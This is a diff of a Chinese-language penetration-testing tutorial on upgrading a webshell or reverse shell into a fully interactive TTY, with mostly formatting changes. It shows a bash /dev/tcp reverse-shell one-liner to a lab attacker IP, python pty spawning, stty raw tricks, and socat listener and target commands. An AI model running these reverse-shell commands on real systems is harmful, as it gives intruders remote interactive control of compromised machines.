@@ -1,15 +1,18 @@
+# 实现交互式shell的几种方式
+
 当我们拿到一个webshell的时候，我们能够执行一些命令，但是这些命令都是非交互的，也就是说不存在上下文的概念。当我们想使用vim、top等命令时，webshell就无能为力了。
 
 那我们怎么获取一个可交互的webshell呢？
 
 ## 1. python pty 方式
 
-一般我们都会使用nc来接收反弹来的shell，只需要在目标上(以linux为例)执行：
+一般我们都会使用nc来接收反弹来的shell，只需要在目标上\(以linux为例\)执行：
 
 ```bash
 bash -i >& /dev/tcp/192.168.2.134/4444 0>&1
 ```
-本地接收一下就ok了，但是反弹回来的shell，或多或少都会存在问题，比如当我想使用top命令时就会提示没有 `tty`。简单的来说就是没有上下文环境，这样的话，``vim``，``sudo``等操作都做不了，有时候还需要其他工具，很麻烦。
+
+本地接收一下就ok了，但是反弹回来的shell，或多或少都会存在问题，比如当我想使用top命令时就会提示没有 `tty`。简单的来说就是没有上下文环境，这样的话，`vim`，`sudo`等操作都做不了，有时候还需要其他工具，很麻烦。
 
 ```bash
 C:\Users\w5023
@@ -27,11 +30,9 @@ tty
 not a tty
 ```
 
-
-
 但是如果发现对方机器上有 python 的话，我们可以：
 
-```
+```text
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
@@ -45,8 +46,8 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 现在攻击机和目标机分别为：
 
-- 攻击机 Linux 192.168.81.160
-- 目标机 Linux 192.168.81.162
+* 攻击机 Linux 192.168.81.160
+* 目标机 Linux 192.168.81.162
 
 简单把反弹一个完全交互shell的过程写出来
 
@@ -81,7 +82,7 @@ $ reset
 # 接下来设置环境变量，根据第一步得到的环境变量来设置
 $ export SHELL=bash   
 $ export TERM=xterm-256color   
-$ stty rows 行数 columns 列数  
+$ stty rows 行数 columns 列数
 ```
 
 到这里，就可以得到一个完美的shell了。
@@ -90,21 +91,20 @@ $ stty rows 行数 columns 列数
 
 socat是类Unix系统下的一个工具，可以看作是 nc 的加强版。我们可以使用socat来传递完整的带有tty的TCP连接。缺点也很明显，**只能在linux下面运行**
 
-下载地址：https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
+下载地址：[https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat)
 
 使用起来也很简单。
 
-- 攻击机：
+* 攻击机：
 
   ```bash
   # 首先安装
   $ sudo apt install socat
   # 执行
   $ socat file:`tty`,raw,echo=0 tcp-listen:4444
-  
   ```
 
-- 目标机
+* 目标机
 
   ```bash
   # 把socat上传到目标机器上或者直接下载
@@ -146,5 +146,6 @@ tty
 
 ## 5. 参考
 
-- https://www.freebuf.com/news/142195.html
-- http://blog.evalbug.com/2018/07/25/antsword_prompt_shell
+* [https://www.freebuf.com/news/142195.html](https://www.freebuf.com/news/142195.html)
+* [http://blog.evalbug.com/2018/07/25/antsword\_prompt\_shell](http://blog.evalbug.com/2018/07/25/antsword_prompt_shell)
+
